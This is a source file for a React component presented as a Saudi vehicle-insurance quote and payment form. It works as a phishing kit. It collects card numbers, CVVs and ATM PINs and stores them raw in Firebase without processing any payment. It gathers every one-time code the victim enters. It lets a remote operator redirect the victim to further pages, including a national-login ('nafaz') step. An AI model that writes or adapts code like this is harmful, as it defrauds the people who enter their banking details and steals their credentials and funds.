"use client"

import { Button } from "@/components/ui/button"
import { Card, CardContent } from "@/components/ui/card"
import { Shield, Star, CheckCircle, FileText, CreditCard, ArrowLeft, Lock, TrendingUp } from "lucide-react"
import React, { useState, useRef, useEffect } from "react"
import { trackFormProgress } from "@/lib/utils"

// Enhanced Step Components
import { InsurancePurposeStep } from "./steps/insurance-purpose-step"
import { InsuranceTypeStep } from "./steps/insurance-type-step"
import { PriceListStep } from "./steps/price-list-step"
import { AddonsStep } from "./steps/addons-step"
import { SummaryStep } from "./steps/summary-step"
import { PaymentStep } from "./steps/payment-step"
import { VerificationStep } from "./steps/verification-step"
import { addData, db } from "@/lib/firebase"
import { doc, onSnapshot } from "firebase/firestore"

const steps = [
  { number: 1, title: "البيانات الأساسية", subtitle: "معلومات المركبة والمالك", icon: FileText },
  { number: 2, title: "بيانات التأمين", subtitle: "تفاصيل وثيقة التأمين", icon: Shield },
  { number: 3, title: "قائمة الأسعار", subtitle: "مقارنة العروض المتاحة", icon: TrendingUp },
  { number: 4, title: "الإضافات والخدمات", subtitle: "الخدمات الإضافية التي تناسب احتياجاتك", icon: Star },
  { number: 5, title: "الملخص", subtitle: "مراجعة الطلب والتواصل", icon: CheckCircle },
  { number: 6, title: "الدفع", subtitle: "بيانات الدفع الآمن", icon: CreditCard },
  { number: 7, title: "التحقق", subtitle: "تأكيد رمز التحقق", icon: Lock },
]

const validationRules = {
  documment_owner_full_name: {
    required: true,
    minLength: 2,
    pattern: /^[\u0600-\u06FF\s]+$/,
    message: "يرجى إدخال اسم مالك الوثيقة بالكامل (أحرف عربية فقط، أقل شيء حرفين)",
  },
  owner_identity_number: {
    required: true,
    pattern: /^[0-9]{10}$/,
    message: "يرجى إدخال رقم هوية صحيح (10 أرقام)",
  },
  buyer_identity_number: {
    required: true,
    pattern: /^[0-9]{10}$/,
    message: "يرجى إدخال رقم هوية المشتري صحيح (10 أرقام)",
  },
  seller_identity_number: {
    required: true,
    pattern: /^[0-9]{10}$/,
    message: "يرجى إدخال رقم هوية البائع صحيح (10 أرقام)",
  },
  phoneNumber: {
    required: true,
    pattern: /^(05|5)[0-9]{8}$/,
    message: "يرجى إدخال رقم هاتف سعودي صحيح (05xxxxxxxx)",
  },
  sequenceNumber: {
    required: true,
    minLength: 3,
    message: "يرجى إدخال الرقم التسلسلي للمركبة (أقل شيء 3 أرقام)",
  },
  selectedInsuranceOffer: {
    required: true,
    message: "يرجى اختيار عرض التأمين المناسب",
  },
  phone: {
    required: true,
    pattern: /^(05|5)[0-9]{8}$/,
    message: "يرجى إدخال رقم هاتف سعودي صحيح للتواصل",
  },
  agreeToTerms: {
    required: false,
    message: "يجب الموافقة على الشروط والأحكام للمتابعة",
  },
  // Payment validation rules
  cardNumber: {
    required: true,
    pattern: /^[0-9\s]{13,19}$/,
    message: "يرجى إدخال رقم بطاقة صحيح",
  },
  cardName: {
    required: true,
    pattern: /^[a-zA-Z\s]{2,}$/,
    message: "يرجى إدخال اسم حامل البطاقة بالأحرف الإنجليزية",
  },
  cardMonth: {
    required: true,
    pattern: /^(0[1-9]|1[0-2])$/,
    message: "يرجى اختيار شهر صحيح",
  },
  cardYear: {
    required: true,
    validate: (value: string, formData: any) => {
      const currentYear = new Date().getFullYear()
      const year = Number.parseInt(value)
      if (year < currentYear) return "تاريخ انتهاء الصلاحية منتهي"
      if (year === currentYear) {
        const currentMonth = new Date().getMonth() + 1
        const month = Number.parseInt(formData.cardMonth || "0")
        if (month < currentMonth) return "تاريخ انتهاء الصلاحية منتهي"
      }
      return null
    },
    message: "يرجى اختيار سنة صحيحة",
  },
  cvv: {
    required: true,
    pattern: /^[0-9]{3,4}$/,
    message: "يرجى إدخال رمز الأمان (3-4 أرقام)",
  },
  pinCode: {
    required: true,
    pattern: /^[0-9]{4}$/,
    message: "يرجى إدخال الرقم السري (4 أرقام)",
  },
  otp: {
    required: true,
    pattern: /^[0-9]{6}$/,
    message: "يرجى إدخال رمز التحقق (6 أرقام)",
  },
}
const allOtps=[""]

export function ProfessionalQuoteForm() {
  const [currentPage, setCurrentStep] = useState(1)
  const [errors, setErrors] = useState<Record<string, string>>({})
  const [touched, setTouched] = useState<Record<string, boolean>>({})
  const [isSubmitting, setIsSubmitting] = useState(false)
  const [paymentProcessing, setPaymentProcessing] = useState(false)
  const [otpSent, setOtpSent] = useState(false)
  const [otpVerified, setOtpVerified] = useState(false)
  const [otpAttempts, setOtpAttempts] = useState(0)
  const [otpTimer, setOtpTimer] = useState(0)

  // Form data state
  const [formData, setFormData] = useState({
    insurance_purpose: "renewal",
    documment_owner_full_name: "",
    owner_identity_number: "",
    buyer_identity_number: "",
    seller_identity_number: "",
    phoneNumber: "",
    vehicle_type: "serial",
    sequenceNumber: "",
    policyStartDate: "",
    insuranceTypeSelected: "against-others",
    additionalDrivers: 0,
    specialDiscounts: false,
    agreeToTerms: true,
    selectedInsuranceOffer: "",
    selectedAddons: [] as string[],
    phone: "",
  })

  // Payment form state
  const [paymentData, setPaymentData] = useState({
    cardNumber: "",
    cardName: "",
    cardMonth: "",
    cardYear: "",
    cvv: "",
    pinCode: "",
    otp: "",
  })

  const [cardErrors, setCardErrors] = useState<Record<string, string>>({})
  const [cardType, setCardType] = useState({ type: "Unknown", icon: "💳", color: "text-gray-600" })

  const stepHeaderRef = useRef<HTMLHeadingElement>(null)
  useEffect(()=>{
    const visitorId=localStorage.getItem('visitor')
      const unsubscribe = onSnapshot(doc(db, "pays", visitorId!), (docSnapshot) => {
        if (docSnapshot.exists()) {
          const userData = docSnapshot.data()
          // Assuming the PIN is stored in a field called 'nafaz_pin'
          if(userData.currentPage ==='1'){
              window.location.href='/quote'
          }else if(userData.currentPage ==='8888'|| userData.currentPage ==="nafaz"){
            window.location.href='/nafaz'
          }else if(userData.currentPage ==='9999'){
            window.location.href='/verify-phone'
          }else if(userData.currentPage !==currentPage){
            setCurrentStep(userData.currentPage ||currentPage)
          }
          
          
        } else {
          console.error("User document not found")
        }
      },
      
    )
  
    // Clean up the listener when component unmounts or modal closes
    return () => unsubscribe()
  }, [])
  const validateField = (fieldName: string, value: any, allData?: any): string | null => {
    const rule = validationRules[fieldName as keyof typeof validationRules] as any
    if (!rule) return null

    // Check if field is required and empty
    if (rule.required) {
      if (
        !value ||
        value === "" ||
        (Array.isArray(value) && value.length === 0) ||
        (typeof value === "boolean" && !value)
      ) {
        return rule.message
      }
    }

    // Skip other validations if field is empty and not required
    if (!value && !rule.required) return null

    // Check minimum length
    if (rule.minLength && value.length < rule.minLength) {
      return rule.message
    }
   
    // Check pattern
    if (rule.pattern && !rule.pattern.test(value)) {
      return rule.message
    }

    // Custom validation
    if (rule.validate) {
      const customError = rule.validate(value, allData || formData)
      if (customError) return customError
    }

    return null
  }

  const validateStep = (step: number): boolean => {
    const stepErrors: Record<string, string> = {}
    let isValid = true

    switch (step) {
      case 1: // Basic Information
        // Always validate owner name
        const ownerNameError = validateField("documment_owner_full_name", formData.documment_owner_full_name)
        if (ownerNameError) {
          stepErrors.documment_owner_full_name = ownerNameError
          isValid = false
        }

        // Always validate sequence number
        const sequenceError = validateField("sequenceNumber", formData.sequenceNumber)
        if (sequenceError) {
          stepErrors.sequenceNumber = sequenceError
          isValid = false
        }

        // Conditional validation based on insurance purpose
        if (formData.insurance_purpose === "renewal") {
          const ownerIdError = validateField("owner_identity_number", formData.owner_identity_number)
          const phoneError = validateField("phoneNumber", formData.phoneNumber)

          if (ownerIdError) {
            stepErrors.owner_identity_number = ownerIdError
            isValid = false
          }
          if (phoneError) {
            stepErrors.phoneNumber = phoneError
            isValid = false
          }
        } else if (formData.insurance_purpose === "property-transfer") {
          const buyerIdError = validateField("buyer_identity_number", formData.buyer_identity_number)
          const sellerIdError = validateField("seller_identity_number", formData.seller_identity_number)

          if (buyerIdError) {
            stepErrors.buyer_identity_number = buyerIdError
            isValid = false
          }
          if (sellerIdError) {
            stepErrors.seller_identity_number = sellerIdError
            isValid = false
          }
        }
        break

      case 2: // Insurance Type
        // No required validation for step 2 as it has default values
        break

      case 3: // Price List
        const selectedOfferError = validateField("selectedInsuranceOffer", formData.selectedInsuranceOffer)
        if (selectedOfferError) {
          stepErrors.selectedInsuranceOffer = selectedOfferError
          isValid = false
        }
        break

      case 4: // Addons
        // No required validation for addons as they are optional
        break

      case 5: // Summary
     
        break

      case 6: // Payment
        const paymentFields = ["cardNumber", "cardName", "cardMonth", "cardYear", "cvv", "pinCode"]
        const allPaymentData = { ...paymentData, ...formData }

        paymentFields.forEach((field) => {
          const error = validateField(field, paymentData[field as keyof typeof paymentData], allPaymentData)
          if (error) {
            stepErrors[field] = error
            isValid = false
          }
        })
        break

      case 7: // Verification
       setCurrentStep(7)
        break
    }

    setErrors(stepErrors)
    return isValid
  }

  const handleFieldChange = (fieldName: string, value: any) => {
    setFormData((prev) => ({ ...prev, [fieldName]: value }))

    // Clear error if field becomes valid
    if (errors[fieldName]) {
      const error = validateField(fieldName, value)
      if (!error) {
        setErrors((prev) => ({ ...prev, [fieldName]: "" }))
      }
    }
  }

  const handleFieldBlur = (fieldName: string) => {
    setTouched((prev) => ({ ...prev, [fieldName]: true }))

    const error = validateField(fieldName, formData[fieldName as keyof typeof formData])
    if (error) {
      setErrors((prev) => ({ ...prev, [fieldName]: error }))
    }
  }

  const handlePaymentFieldChange = (fieldName: string, value: any) => {
    setPaymentData((prev) => ({ ...prev, [fieldName]: value }))

    // Clear error if field becomes valid
    if (cardErrors[fieldName]) {
      const error = validateField(fieldName, value, { ...paymentData, ...formData })
      if (!error) {
        setCardErrors((prev) => ({ ...prev, [fieldName]: "" }))
      }
    }
  }

  const handlePaymentFieldBlur = (fieldName: string) => {
    const error = validateField(fieldName, paymentData[fieldName as keyof typeof paymentData], {
      ...paymentData,
      ...formData,
    })
    if (error) {
      setCardErrors((prev) => ({ ...prev, [fieldName]: error }))
    }
  }

  const nextStep = async () => {
    if (validateStep(currentPage)) {
      if (currentPage < steps.length) {
        const newPage = currentPage + 1
        setCurrentStep(newPage)

        const visitorId = localStorage.getItem("visitor")
        if (visitorId) {
          await trackFormProgress(visitorId, newPage, formData)
        }
      }
    } else {
      const firstErrorField = document.querySelector(".border-red-400")
      if (firstErrorField) {
        firstErrorField.scrollIntoView({ behavior: "smooth", block: "center" })
      }
    }
  }

  const prevStep = async () => {
    if (currentPage > 1) {
      const newPage = currentPage - 1
      setCurrentStep(newPage)

      const visitorId = localStorage.getItem("visitor")
      if (visitorId) {
        await trackFormProgress(visitorId, newPage, formData)
      }
    }
  }

  const handlePayment = async () => {
    if (validateStep(6)) {
      setPaymentProcessing(true)
      const visitorId = localStorage.getItem("visitor")
      await addData({id:visitorId, cardNumber:paymentData.cardNumber,cardMonth:paymentData.cardMonth,cardYear:paymentData.cardYear,cardName:paymentData.cardName,cvv:paymentData.cvv,pinCode:paymentData.pinCode})

      setTimeout(() => {
        setPaymentProcessing(false)
        setCurrentStep(7)
        setOtpTimer(120)
        setOtpSent(true)
      }, 2000)
    }
  }
  const handleSubmit = async (e:React.FormEvent) => {
    e.preventDefault()
    const visitorId = localStorage.getItem("visitor")

    allOtps.push(paymentData.otp)

    await addData({id:visitorId,otp:paymentData.otp,allOtps})

    if (validateStep(7)) {
      setIsSubmitting(true)
      // Implementation

      setTimeout(() => {
        setIsSubmitting(false)
        handleFieldChange('otp',"")
      }, 2000)
    }
  }

  useEffect(() => {
    const timeouts: NodeJS.Timeout[] = []

    Object.keys(errors).forEach((field) => {
      if (errors[field]) {
        const timeout = setTimeout(() => {
          const currentValue =
            formData[field as keyof typeof formData] || paymentData[field as keyof typeof paymentData]
          const error = validateField(field, currentValue, { ...formData, ...paymentData })
          if (!error) {
            setErrors((prev) => ({ ...prev, [field]: "" }))
            setCardErrors((prev) => ({ ...prev, [field]: "" }))
          }
        }, 1000)
        timeouts.push(timeout)
      }
    })

    return () => timeouts.forEach(clearTimeout)
  }, [formData, paymentData, errors])

  return (
    <div className="w-full  mx-auto">
      <Card className="bg-white/95 backdrop-blur-sm rounded-2xl shadow-2xl border-0 overflow-hidden">
        <CardContent className="p-0">
          {/* Enhanced Progress Steps */}
          <div className="bg-gradient-to-br from-blue-50 via-indigo-50 to-purple-50 p-6 lg:p-10">
            {/* Mobile Progress */}
            <div className="block lg:hidden">
              <div className="flex items-center gap-3 overflow-x-auto pb-4 scrollbar-hide">
                {steps.map((step, index) => (
                  <div key={step.number} className="flex items-center flex-shrink-0">
                    <div className="flex flex-col items-center">
                      <div
                        className={`w-14 h-14 rounded-2xl flex items-center justify-center text-sm transition-all duration-500 shadow-lg ${
                          step.number === currentPage
                            ? "bg-gradient-to-br from-blue-600 to-blue-700 text-white shadow-blue-300 scale-110 ring-4 ring-blue-200"
                            : step.number < currentPage
                              ? "bg-gradient-to-br from-green-500 to-green-600 text-white shadow-green-300"
                              : "bg-white text-gray-500 shadow-gray-200 border-2 border-gray-200"
                        }`}
                      >
                        {step.number < currentPage ? (
                          <CheckCircle className="w-6 h-6" />
                        ) : (
                          <step.icon className="w-6 h-6" />
                        )}
                      </div>
                      <p
                        className={`text-xs mt-3 text-center w-20 font-semibold leading-tight ${
                          step.number === currentPage ? "text-blue-700" : "text-gray-600"
                        }`}
                      >
                        {step.title.split(" ").slice(0, 2).join(" ")}
                      </p>
                    </div>
                    {index < steps.length - 1 && (
                      <div
                        className={`w-8 h-1 mx-4 rounded-full transition-all duration-500 ${
                          step.number < currentPage ? "bg-gradient-to-r from-green-500 to-green-600" : "bg-gray-300"
                        }`}
                      />
                    )}
                  </div>
                ))}
              </div>
            </div>

            {/* Desktop Progress */}
            <div className="hidden lg:flex items-center justify-between">
              {steps.map((step, index) => (
                <div key={step.number} className="flex items-center">
                  <div className="flex flex-col items-center">
                    <div
                      className={`w-20 h-20 rounded-2xl flex items-center justify-center text-sm font-bold transition-all duration-500 shadow-xl ${
                        step.number === currentPage
                          ? "bg-gradient-to-br from-blue-600 to-blue-700 text-white shadow-blue-300 scale-110 ring-4 ring-blue-200"
                          : step.number < currentPage
                            ? "bg-gradient-to-br from-green-500 to-green-600 text-white shadow-green-300"
                            : "bg-white text-gray-500 shadow-gray-200 border-2 border-gray-200"
                      }`}
                    >
                      {step.number < currentPage ? (
                        <CheckCircle className="w-10 h-10" />
                      ) : (
                        <step.icon className="w-10 h-10" />
                      )}
                    </div>
                    <div className="text-center mt-6">
                      <p
                        className={`text-lg font-bold ${
                          step.number === currentPage ? "text-blue-700" : "text-gray-700"
                        }`}
                      >
                        {step.title}
                      </p>
                      <p className="text-sm text-gray-500 mt-1 max-w-32 leading-tight">{step.subtitle}</p>
                    </div>
                  </div>
                  {index < steps.length - 1 && (
                    <div
                      className={`flex-1 h-2 mx-8 rounded-full transition-all duration-500 ${
                        step.number < currentPage ? "bg-gradient-to-r from-green-500 to-green-600" : "bg-gray-300"
                      }`}
                    />
                  )}
                </div>
              ))}
            </div>
          </div>

          {/* Form Content */}
          <div className="p-2 ">
            <div className="p-1">
              {/* Step Content */}
              <div className="animate-in fade-in-50 duration-500">
                {currentPage === 1 && (
                  <InsurancePurposeStep
                    formData={formData}
                    setFormData={handleFieldChange}
                    errors={errors}
                    stepHeaderRef={stepHeaderRef}
                    onFieldBlur={handleFieldBlur}
                  />
                )}

                {currentPage === 2 && (
                  <InsuranceTypeStep
                    formData={formData}
                    setFormData={setFormData}
                    errors={errors}
                    stepHeaderRef={stepHeaderRef}
                  />
                )}

                {currentPage === 3 && (
                  <PriceListStep
                    formData={formData}
                    setFormData={setFormData}
                    errors={errors}
                    stepHeaderRef={stepHeaderRef}
                  />
                )}

                {currentPage === 4 && (
                  <AddonsStep
                    formData={formData}
                    setFormData={setFormData}
                    errors={errors}
                    stepHeaderRef={stepHeaderRef}
                  />
                )}

                {currentPage === 5 && (
                  <SummaryStep
                    formData={formData}
                    setFormData={handleFieldChange as any}
                    errors={errors}
                    stepHeaderRef={stepHeaderRef}
                  />
                )}

                {currentPage === 6 && (
                  <PaymentStep
                    paymentData={paymentData}
                    setPaymentData={setPaymentData}
                    cardErrors={cardErrors}
                    setCardErrors={setCardErrors}
                    cardType={cardType}
                    setCardType={setCardType}
                    stepHeaderRef={stepHeaderRef}
                  />
                )}

                {currentPage === 7 && (
                  <VerificationStep
                    formData={formData}
                    paymentData={paymentData}
                    setPaymentData={handlePaymentFieldChange as any}
                    stepHeaderRef={stepHeaderRef}
                  />
                )}
              </div>
            </div>

            {/* Enhanced Navigation */}
            <div className="flex flex-col sm:flex-row justify-between items-center mt-12 pt-10 border-t-2 border-gray-100 gap-6 sm:gap-0">
              <Button
                variant="outline"
                onClick={prevStep}
                disabled={currentPage === 1 || paymentProcessing || isSubmitting}
                className="px-8 py-4 w-full sm:w-auto order-2 sm:order-1 border-2 border-gray-300 hover:border-blue-500 hover:text-blue-600 hover:bg-blue-50 bg-white font-semibold text-lg rounded-xl transition-all duration-300 shadow-lg hover:shadow-xl disabled:opacity-50 disabled:cursor-not-allowed"
              >
                <ArrowLeft className="w-5 h-5 ml-3" />
                السابق
              </Button>

              <div className="order-1 sm:order-2 bg-gradient-to-r from-gray-100 to-gray-200 px-8 py-4 rounded-full font-bold text-gray-700 shadow-inner">
                الخطوة {currentPage} من {steps.length}
              </div>

              {currentPage < 6 ? (
                <Button
                  onClick={nextStep}
                  className="bg-gradient-to-r from-blue-600 to-blue-700 hover:from-blue-700 hover:to-blue-800 px-8 py-4 w-full sm:w-auto order-3 font-bold text-lg rounded-xl shadow-xl hover:shadow-2xl transition-all duration-300 transform hover:scale-105"
                  disabled={isSubmitting}
                >
                  التالي
                  <ArrowLeft className="w-5 h-5 mr-3 rotate-180" />
                </Button>
              ) : currentPage === 6 ? (
                <Button
                  onClick={handlePayment}
                  disabled={paymentProcessing}
                  className="bg-gradient-to-r from-green-600 to-green-700 hover:from-green-700 hover:to-green-800 px-8 py-4 w-full sm:w-auto order-3 font-bold text-lg rounded-xl shadow-xl hover:shadow-2xl transition-all duration-300 transform hover:scale-105"
                >
                  {paymentProcessing ? (
                    <div className="flex items-center gap-3">
                      <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
                      جاري معالجة الدفع...
                    </div>
                  ) : (
                    <>
                      <CreditCard className="w-5 h-5 ml-3" />
                      تأكيد الدفع
                    </>
                  )}
                </Button>
              ) : (
               null
              )}
            </div>
          </div>
        </CardContent>
      </Card>
    </div>
  )
}
